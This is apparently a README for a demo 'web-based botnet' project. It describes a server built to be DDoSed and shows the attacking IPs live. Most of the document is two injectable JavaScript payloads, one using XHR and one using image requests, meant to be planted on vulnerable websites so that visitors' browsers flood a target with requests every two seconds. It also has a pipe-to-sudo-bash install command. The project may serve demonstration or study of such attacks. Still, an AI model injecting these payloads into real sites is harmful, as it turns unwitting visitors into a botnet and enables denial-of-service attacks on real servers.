# web-based-botnet

Attackers can inject Javascript code to vulnerable websites which could in turn launch DDoS attacks towards targets. 
This is a vulnerable server created to be DDoS. <br />
It gives live updates about the ip addresses that is attacking it. <br />

These injected payloads will continuously request resources from the vulnerable server.

## Dependencies

#### Install NodeJS

```bash
curl -sL https://deb.nodesource.com/setup_6.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo apt-get -y install build-essential
```

#### Install packages

```bash
npm install # expressjs, socket.io
```

## Payload for vulnerable websites
#### Via XHR
```html
<script>
function poll() {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "http://192.168.1.22:3000", true);
	xhr.onload = function (e) {
	  if (xhr.readyState === 4) {
	    if (xhr.status === 200) {
	      console.log(xhr.responseText);
	    } else {
	      console.error(xhr.statusText);
	    }
	  }
	};
	xhr.onerror = function (e) {
	  console.error(xhr.statusText);
	};
	xhr.send(null);
}
function start() {
	setInterval(poll, 2000)
}
start()
</script>
```

#### Via image
```html
<script> 
setInterval(function(){ 
  var img = new Image(); 
  img.src = 'http://192.168.1.22:3000/cat.jpg?' + (new Date()).getTime()
}, 2000); 
</script>
```
